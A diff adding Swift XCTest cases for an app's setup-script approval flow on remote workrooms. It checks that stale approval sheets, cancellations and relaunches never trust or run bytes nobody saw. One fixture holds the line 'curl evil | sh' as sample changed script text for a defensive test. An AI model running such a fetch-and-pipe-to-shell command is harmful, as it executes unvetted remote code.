@@ -1020,6 +1020,13 @@ final class CreationFlowTests: XCTestCase {
     func trustScript(_ name: String, text: Data, project: String) async throws {
       state.withLock { $0.log.append("trust \(name) \(String(decoding: text, as: UTF8.self))") }
     }
+    /// The host's copy, approved once a `trust` was recorded.
+    func judgeScript(_ name: String, text: Data, project: String) async throws -> ScriptTrust {
+      let script = CreationFlowTests.hostScript
+      return ScriptTrust(
+        name: script.name, origin: script.origin, sha256: script.sha256, text: script.text,
+        trusted: calls.contains { $0.hasPrefix("trust \(name)") }, exempt: false)
+    }
     func addProject(_ path: String, create: Bool) async throws -> String { path }
     func create(
       project: String, onLog: ((String) -> Void)?, onReady: ((String, String, Bool) -> Void)?
@@ -1033,6 +1040,59 @@ final class CreationFlowTests: XCTestCase {
     func deleteProject(
       _ path: String, withWorkrooms: Bool, fromDisk: Bool, onLog: ((String) -> Void)?
     ) async throws -> [URL] { [] }
+  }
+
+  /// A CLI that keeps each workroom's host record as `set-host` writes it, and lists it back
+  /// (with any seeded) cut to its state, id and setup mark: no driver or provisioner, so no reload
+  /// adopts it.
+  private final class HostRecordingRemoteCLI: RemoteFakeCLI, @unchecked Sendable {
+    private let hosts = Mutex<[String: HostDescriptor]>([:])
+    func host(of name: String) -> HostDescriptor? { hosts.withLock { $0[name] } }
+    func seed(_ name: String, _ host: HostDescriptor) { hosts.withLock { $0[name] = host } }
+
+    override func setHost(project: String, workroom: String?, descriptor: Data?) async throws {
+      try await super.setHost(project: project, workroom: workroom, descriptor: descriptor)
+      guard let workroom, let descriptor else { return }
+      let host = try JSONDecoder().decode(HostDescriptor.self, from: descriptor)
+      seed(
+        workroom,
+        HostDescriptor(state: host.state, id: host.id, setupPending: host.setupPending))
+    }
+
+    override func list(warnings: String, project: String?) async throws -> ListResponse {
+      let listed = try await super.list(warnings: warnings, project: project)
+      let recorded = hosts.withLock { $0 }
+      return ListResponse(
+        projects: listed.projects.map { listed in
+          let names = listed.workrooms.map(\.name)
+          let seeded = recorded.keys.filter { !names.contains($0) }.sorted()
+          return Project(
+            path: listed.path, vcs: listed.vcs,
+            workrooms: (names + seeded).map { name in
+              Workroom(
+                name: name, path: "/home/boxd/r", vcsName: "workroom/\(name)", warnings: [],
+                host: recorded[name])
+            })
+        }, workroomsDir: nil, configPath: nil)
+    }
+  }
+
+  /// A CLI listing each created workroom's host as still `creating`, as a crash or a create that
+  /// hasn't recorded it serving leaves it. Not live (no id), so its delete only forgets it.
+  private final class CreatingHostRemoteCLI: RemoteFakeCLI, @unchecked Sendable {
+    override func list(warnings: String, project: String?) async throws -> ListResponse {
+      let listed = try await super.list(warnings: warnings, project: project)
+      return ListResponse(
+        projects: listed.projects.map { listed in
+          Project(
+            path: listed.path, vcs: listed.vcs,
+            workrooms: listed.workrooms.map {
+              Workroom(
+                name: $0.name, path: $0.path, vcsName: $0.vcsName, warnings: [],
+                host: $0.name == "anchor" ? nil : HostDescriptor(state: "creating"))
+            })
+        }, workroomsDir: nil, configPath: nil)
+    }
   }
 
   /// A CLI that won't record an approval.
@@ -1440,6 +1500,216 @@ final class CreationFlowTests: XCTestCase {
     XCTAssertFalse(fixture.cli.calls.contains("delete calm-river"), "it was deleted")
   }
 
+  /// Value: protects=a sheet left up while another window answered, and the create asked again
+  /// about other bytes, approves or skips nothing: each sheet action answers only the bytes it
+  /// showed; fails_when=the stale Approve records or runs bytes nobody saw, or the stale skip
+  /// carries on; why_new=Approve read the run's current script at click time; seam=none;
+  /// no_claim=the sheet's drawing
+  func testAStaleApprovalSheetAnswersNothingOnceTheRunAsksAboutOtherBytes() async throws {
+    let changed = ScriptTrust(
+      name: "workroom_setup", origin: "stdin", sha256: String(repeating: "c", count: 64),
+      text: "#!/bin/sh\ncurl evil | sh\n", trusted: false, exempt: false)
+    let fixture = try pausedRemoteCreate(unapprovedAfterApproval: 1, rejudgedAs: changed)
+    defer { fixture.daemon.stop() }
+    let run = try await fixture.pause()
+    let lifecycle = fixture.store.lifecycle
+    // The sheet up in this window shows the first bytes; another window approves them.
+    let stale = try XCTUnwrap(fixture.store.modals.errorApproval)
+    await lifecycle.approveSetupScript(run, shown: Self.hostScript, from: fixture.store)
+    await waitUntil(
+      { run.outcome == .scriptNotTrusted(changed) && lifecycle.hostScriptApprovals[run.id] != nil },
+      "the create didn't ask about the changed bytes")
+    let trusts = { fixture.cli.calls.filter { $0.hasPrefix("trust workroom_setup") } }
+    XCTAssertEqual(trusts().count, 1)
+
+    stale.run()
+    await lifecycle.approveSetupScript(run, shown: Self.hostScript, from: fixture.store)
+    await lifecycle.skipSetupScript(run, shown: Self.hostScript, from: fixture.store)
+    for _ in 0..<20 { await Task.yield() }
+
+    XCTAssertEqual(trusts().count, 1, "a stale sheet approved bytes it never showed")
+    XCTAssertNotNil(lifecycle.hostScriptApprovals[run.id], "a stale sheet answered the create")
+    XCTAssertEqual(run.outcome, .scriptNotTrusted(changed))
+    XCTAssertEqual(fixture.scripts.count, 2, "the script ran")
+
+    await lifecycle.approveSetupScript(run, shown: changed, from: fixture.store)
+    await fixture.task.value
+    XCTAssertEqual(run.outcome, .succeeded)
+    XCTAssertTrue(trusts().last?.hasSuffix(changed.text) == true, "the shown bytes weren't trusted")
+  }
+
+  /// Value: protects=Cancel Creation on a paused remote create whose host is still recorded
+  /// `creating` deletes it: the run stops counting as running before its delete is asked;
+  /// fails_when=the delete refuses it as mid-create and the create fails with the machine left;
+  /// why_new=the fixture's workrooms had no host; seam=none; no_claim=the host's destroy
+  func testCancellingAPausedCreateWhoseHostIsStillCreatingDeletesIt() async throws {
+    let fixture = try pausedRemoteCreate(cli: CreatingHostRemoteCLI.self)
+    defer { fixture.daemon.stop() }
+    let run = try await fixture.pause()
+
+    fixture.store.lifecycle.closeCreation(run, from: fixture.store)
+    await fixture.task.value
+
+    XCTAssertEqual(run.outcome, .cancelled)
+    XCTAssertTrue(fixture.store.lifecycle.creationRuns.isEmpty, "the run lingered")
+    await waitUntil(
+      { fixture.cli.calls.contains("delete calm-river") }, "the workroom was not deleted")
+  }
+
+  /// Value: protects=a remote create paused at its setup script marks its workroom's record
+  /// setup-pending, so a quit leaves it saying so, and clears it once the script runs; while the
+  /// create lives its pane, not the mark, asks; fails_when=no mark is written, it stays after the
+  /// script ran, or the workroom reads pending beside its live create; why_new=the pause lived
+  /// only in memory; seam=none; no_claim=the CLI's config write (the Go tests)
+  func testAPausedRemoteCreateMarksItsSetupPendingUntilTheScriptRuns() async throws {
+    let fixture = try pausedRemoteCreate(cli: HostRecordingRemoteCLI.self)
+    defer { fixture.daemon.stop() }
+    let run = try await fixture.pause()
+    let cli = try XCTUnwrap(fixture.cli as? HostRecordingRemoteCLI)
+    XCTAssertEqual(cli.host(of: "calm-river")?.setupPending, true, "no mark was written")
+    let workroom = try XCTUnwrap(
+      fixture.store.projectStore.projects.first?.workrooms.first { $0.name == "calm-river" })
+    XCTAssertEqual(workroom.host?.isSetupPending, true, "the reload didn't publish the mark")
+    XCTAssertFalse(
+      fixture.store.lifecycle.isSetupPending(workroom, inProject: run.project.path),
+      "the workroom reads pending beside its live create")
+
+    await fixture.store.lifecycle.approveSetupScript(run, from: fixture.store)
+    await fixture.task.value
+    XCTAssertEqual(run.outcome, .succeeded)
+    XCTAssertNil(cli.host(of: "calm-river")?.setupPending, "the mark outlived the script")
+  }
+
+  /// Value: protects=Continue Without Script on a paused remote create clears its setup-pending
+  /// mark; fails_when=the mark stays, and the workroom asks again after a relaunch; seam=none;
+  /// no_claim=the CLI's config write
+  func testContinueWithoutScriptClearsTheSetupPendingMark() async throws {
+    let fixture = try pausedRemoteCreate(cli: HostRecordingRemoteCLI.self)
+    defer { fixture.daemon.stop() }
+    let run = try await fixture.pause()
+    let cli = try XCTUnwrap(fixture.cli as? HostRecordingRemoteCLI)
+
+    await fixture.store.lifecycle.skipSetupScript(run, from: fixture.store)
+    await fixture.task.value
+    XCTAssertEqual(run.outcome, .succeeded)
+    XCTAssertNil(cli.host(of: "calm-river")?.setupPending, "the mark stayed")
+  }
+
+  /// Value: protects=a paused remote create dropped (its pane gone) keeps its setup-pending mark,
+  /// and with no create left the workroom reads pending, as after a relaunch; fails_when=the drop
+  /// clears the mark, or nothing says the script never ran; seam=none; no_claim=the drawing
+  func testADroppedPausedCreateKeepsItsSetupPending() async throws {
+    let fixture = try pausedRemoteCreate(cli: HostRecordingRemoteCLI.self)
+    defer { fixture.daemon.stop() }
+    let run = try await fixture.pause()
+    let cli = try XCTUnwrap(fixture.cli as? HostRecordingRemoteCLI)
+
+    fixture.store.lifecycle.discardCreationRun(run)
+    await fixture.task.value
+    XCTAssertEqual(cli.host(of: "calm-river")?.setupPending, true, "the drop cleared the mark")
+    let workroom = try XCTUnwrap(
+      fixture.store.projectStore.projects.first?.workrooms.first { $0.name == "calm-river" })
+    XCTAssertTrue(fixture.store.lifecycle.isSetupPending(workroom, inProject: run.project.path))
+  }
+
+  /// A store after a relaunch, its remote workroom `calm-river`'s setup pending, reached through a
+  /// fake host whose setup script runs only once a `trust` is recorded.
+  private func relaunchedWithASetupPending() throws -> (
+    store: AppStore, cli: HostRecordingRemoteCLI, workroom: Workroom, project: Project,
+    requests: Calls<String>
+  ) {
+    let root = try projectWithASetupScript()
+    let cli = HostRecordingRemoteCLI(projectPath: root.path)
+    let host = HostDescriptor(id: UUID(), setupPending: true)
+    cli.seed("calm-river", host)
+    let store = makeStore(cli)
+    let workroom = Workroom(
+      name: "calm-river", path: "/home/boxd/r", vcsName: "workroom/calm-river", warnings: [],
+      host: host)
+    let project = Project(path: root.path, vcs: root.vcs, workrooms: [workroom])
+    store.projectStore.projects = [project]
+    let driver = FakeDriver()
+    let requests = Calls<String>()
+    var services = services(driver: driver, daemon: nil)
+    services.existingHost = { _ in
+      RemoteCreateHost(
+        key: .boxd(org: "acme", account: "u"), driver: driver,
+        environment: .init(driver: driver, daemonSocket: driver.daemonSocket))
+    }
+    services.script = { request in
+      let judged: ScriptTrust
+      do { judged = try await request.judge(Data(Self.hostScript.text.utf8)) } catch {
+        return .failed("judge failed")
+      }
+      guard judged.trusted else { return .notTrusted(judged) }
+      requests.add("\(request.workroom) \(request.path) \(request.host)")
+      request.onStart()
+      request.onLine("set up")
+      return .passed
+    }
+    store.services.remoteCreate = services
+    return (store, cli, workroom, project, requests)
+  }
+
+  /// Value: protects=after a relaunch, Review Script… on a workroom whose setup is pending shows
+  /// the host's copy in the approval sheet, and its Approve records exactly those bytes and runs the
+  /// setup script on that workroom's host, clearing the mark; fails_when=nothing shows, other
+  /// bytes are recorded, a create starts, or the mark stays; why_new=the pause lived only in
+  /// memory; seam=RemoteCreateServices.existingHost; no_claim=a real host
+  func testReviewScriptThenApproveRunsAPendingSetupOnItsWorkroom() async throws {
+    let (store, cli, workroom, project, requests) = try relaunchedWithASetupPending()
+    XCTAssertTrue(store.lifecycle.isSetupPending(workroom, inProject: project.path))
+
+    await store.lifecycle.reviewPendingSetup(workroom, in: project, from: store)
+    XCTAssertEqual(store.modals.errorTitle, "Approve the setup script?")
+    XCTAssertEqual(store.modals.errorLog, Self.hostScript.visibleText)
+    XCTAssertEqual(store.modals.errorAction?.label, "Continue Without Script…")
+    XCTAssertTrue(requests.all.isEmpty, "the script ran before it was approved")
+    let approve = try XCTUnwrap(store.modals.errorApproval)
+
+    approve.run()
+    await waitUntil({ cli.host(of: "calm-river")?.setupPending == nil }, "the mark stayed")
+    XCTAssertEqual(
+      cli.calls.filter { $0.hasPrefix("trust") }, ["trust workroom_setup \(Self.hostScript.text)"])
+    let id = try XCTUnwrap(workroom.host?.id)
+    XCTAssertEqual(requests.all, ["calm-river /home/boxd/r \(HostID.remote(id))"])
+    XCTAssertFalse(cli.calls.contains("reserve"), "a create started")
+    XCTAssertTrue(store.lifecycle.pendingSetupRuns.isEmpty)
+  }
+
+  /// Value: protects=an approved pending setup whose script never starts (its host unreachable)
+  /// keeps the mark, so Review Script… stays on offer, and says why; fails_when=the mark is
+  /// cleared though nothing ran; seam=RemoteCreateServices.existingHost; no_claim=why the host
+  /// couldn't be reached
+  func testAPendingSetupWhoseScriptNeverStartsStaysPending() async throws {
+    let (store, cli, workroom, project, _) = try relaunchedWithASetupPending()
+    await store.lifecycle.reviewPendingSetup(workroom, in: project, from: store)
+    let approve = try XCTUnwrap(store.modals.errorApproval)
+    store.services.remoteCreate.existingHost = { _ in throw RemoteWorkrooms.Failure.signedOut }
+
+    approve.run()
+    await waitUntil(
+      { cli.calls.contains { $0.hasPrefix("trust") } && store.lifecycle.pendingSetupRuns.isEmpty },
+      "the approval didn't finish")
+    XCTAssertEqual(cli.host(of: "calm-river")?.setupPending, true, "the mark was cleared")
+    XCTAssertEqual(store.modals.errorTitle, "The setup script of ‘calm-river’ failed")
+    XCTAssertTrue(
+      store.lifecycle.isSetupPending(
+        try XCTUnwrap(store.projectStore.projects.first?.workrooms.first), inProject: project.path))
+  }
+
+  /// Value: protects=Continue Without Script on a workroom whose setup is pending clears the mark
+  /// and runs nothing; fails_when=the mark stays or the script runs; seam=none; no_claim=the
+  /// confirmation's drawing
+  func testContinueWithoutScriptOnAPendingSetupClearsIt() async throws {
+    let (store, cli, workroom, project, requests) = try relaunchedWithASetupPending()
+
+    await store.lifecycle.skipPendingSetup(workroom.name, in: project.path, from: store)
+    XCTAssertNil(cli.host(of: "calm-river")?.setupPending, "the mark stayed")
+    XCTAssertTrue(requests.all.isEmpty, "the script ran")
+    XCTAssertFalse(cli.calls.contains { $0.hasPrefix("trust") }, "something was approved")
+  }
+
   /// A remote create that will pause at its setup script: the host's script is unapproved until the
   /// CLI records it, and `pause()` starts the create and waits for the question.
   private struct PausedRemoteCreate {
@@ -1466,8 +1736,10 @@ final class CreationFlowTests: XCTestCase {
 
   /// `unapprovedAfterApproval`: how many more times the host's copy judges unapproved once an
   /// approval is recorded, as a checkout that changed meanwhile would.
+  /// `rejudgedAs`: the bytes those later judges find, the host's copy changed meanwhile.
   private func pausedRemoteCreate(
-    cli type: RemoteFakeCLI.Type = RemoteFakeCLI.self, unapprovedAfterApproval: Int = 0
+    cli type: RemoteFakeCLI.Type = RemoteFakeCLI.self, unapprovedAfterApproval: Int = 0,
+    rejudgedAs: ScriptTrust = CreationFlowTests.hostScript
   ) throws -> PausedRemoteCreate {
     let project = try projectWithASetupScript()
     let daemon = try FakeDaemon(version: 4, execResult: Self.gitSucceeds)
@@ -1486,7 +1758,7 @@ final class CreationFlowTests: XCTestCase {
       guard approved else { return .notTrusted(Self.hostScript) }
       if rejudged.count < unapprovedAfterApproval {
         rejudged.add()
-        return .notTrusted(Self.hostScript)
+        return .notTrusted(rejudgedAs)
       }
       request.onStart()
       return .passed
@@ -1501,7 +1773,7 @@ final class CreationFlowTests: XCTestCase {
   }
 
   /// The setup script as the host's checkout holds it, judged over stdin.
-  private static let hostScript = ScriptTrust(
+  nonisolated fileprivate static let hostScript = ScriptTrust(
     name: "workroom_setup", origin: "stdin", sha256: String(repeating: "a", count: 64),
     text: UntrustedSetupCLI.script.text, trusted: false, exempt: false)
 
@@ -2197,5 +2469,19 @@ final class CreationFlowTests: XCTestCase {
         XCTAssertTrue(store.lifecycle.creationRuns.isEmpty, "both ended")
       }
     }
+  }
+}
+
+extension WorkroomLifecycle {
+  /// Approve on a sheet showing the script `run` waits on now.
+  func approveSetupScript(_ run: CreationRun, from window: any LifecycleWindow) async {
+    guard case .scriptNotTrusted(let script) = run.outcome else { return }
+    await approveSetupScript(run, shown: script, from: window)
+  }
+
+  /// Continue Without Script on a sheet showing the script `run` waits on now.
+  func skipSetupScript(_ run: CreationRun, from window: any LifecycleWindow) async {
+    guard case .scriptNotTrusted(let script) = run.outcome else { return }
+    await skipSetupScript(run, shown: script, from: window)
   }
 }
